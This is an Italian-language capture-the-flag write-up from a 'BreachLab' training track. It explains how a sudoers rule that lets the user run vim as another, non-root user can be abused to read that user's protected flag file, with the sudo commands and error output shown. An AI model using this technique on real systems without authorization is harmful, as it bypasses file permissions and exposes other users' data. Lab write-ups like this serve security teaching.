```
 ========================================================================
   B R E A C H L A B   ::   F I E L D   N O T E S
 ------------------------------------------------------------------------
   phantom track · phile 0x02 · "sudo games"
 ========================================================================

   target ..: phantom-02  "Sudo Games"
   class ...: privesc / sudoers RunAs non-root
   tools ...: sudo -l · vim
   author ..: noflyfre
   status ..: owned
```

[← indice](../../README.md)

> hai sudo, ma non su root. il trucco è leggere davvero l'output di
> `sudo -l`: quel `(utente)` tra parentesi è il RunAs, e con un editor
> concesso apri qualunque file che lui può leggere.

## ----[ 0x00 · intel ]----

Il brief: `phantom2` ha diritti sudo limitati, non su tutto e non su
root. Obiettivo: enumerare cosa può eseguire e **come quale utente**, poi
usare quel privilegio per leggere un file protetto di un altro utente,
individuabile enumerando i permessi della directory delle flag.

## ----[ 0x01 · recon ]----

La home di `phantom2` ha solo `BRIEFING`. `sudo -l` rivela il privilegio:
un binario eseguibile senza password, ma **non come root** — con un
`RunAs` verso un altro utente.

La directory delle flag mostra un file per ogni "flagkeeper", tutti
leggibili solo dal proprietario. L'utente corrente non può leggere il
target (`Permission denied`), ma può eseguire il binario concesso proprio
come il proprietario del file.

## ----[ 0x02 · il difetto ]----

Sfruttamento di una regola sudoers con **RunAs non-root**. In molti
pensano a `sudo` solo come "esegui come root", ma la sintassi permette un
RunAs arbitrario (`(utente) comando`). Se il binario concesso è un editor
di testo, senza restrizioni sull'argomento nella entry, si può aprire
**qualunque file leggibile dall'utente target**:

```
sudo -u <utente_target> /usr/bin/vim <file>
```

Il file si apre coi permessi effettivi del target, bypassando la
protezione. Vari tentativi alternativi (assumere root, `su` verso utente
inesistente) falliscono perché non combaciano col privilegio concesso —
la lezione è leggere con precisione `sudo -l`, campo `RunAs` incluso,
prima di agire.

## ----[ 0x03 · exploit ]----

1. Privilegio sudo concesso:

```bash
sudo -l
```

Il target non è root, è un utente specifico tra parentesi.

2. File target (il proprietario è l'utente verso cui fare pivot):

```bash
cd /var/lib/phantom-flags
cat level2_flag
cat: level2_flag: Permission denied
```

3. Tentativi falliti che chiariscono i limiti della regola:

```bash
sudo vim level2_flag
Sorry, user phantom2 is not allowed to execute '/usr/bin/vim level2_flag' as root on phantom.

sudo su phantom
Sorry, user phantom2 is not allowed to execute '/usr/bin/su phantom' as root on phantom.

sudo -u phantom /usr/bin/vim level2_flag
sudo: unknown user phantom
```

Senza specificare l'utente giusto, sudo assume root (non concesso) e
rifiuta.

4. Esecuzione corretta col target consentito:

```bash
sudo -u <REDACTED> /usr/bin/vim level2_flag
```

Il file si apre coi permessi del proprietario.

## ----[ 0x04 · loot ]----

Aprire il file coi privilegi dell'utente del RunAs bypassa i permessi
Unix ed espone la flag (valore fuori dal writeup). Lezione: `sudo -l` va
letto fino all'ultima parentesi — il RunAs è metà dell'exploit.

```
--[ eof ]---------------------------------------------------------------

  breachlab.org · phantom track
```
